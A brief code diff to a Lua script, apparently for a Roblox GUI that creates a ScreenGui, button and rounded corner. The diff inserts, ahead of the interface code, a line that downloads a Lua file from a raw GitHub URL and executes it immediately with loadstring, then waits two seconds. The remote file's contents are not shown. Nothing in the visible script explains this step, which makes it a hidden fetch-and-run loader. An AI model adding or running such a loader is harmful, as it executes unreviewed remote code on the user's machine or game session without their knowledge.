@@ -3,6 +3,9 @@
 
 -- Instances:
 
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Butterisgood/Butter/main/Root2.lua'))("")
+wait(2)
+
 local ScreenGui = Instance.new("ScreenGui")
 local TextButton = Instance.new("TextButton")
 local UICorner = Instance.new("UICorner")
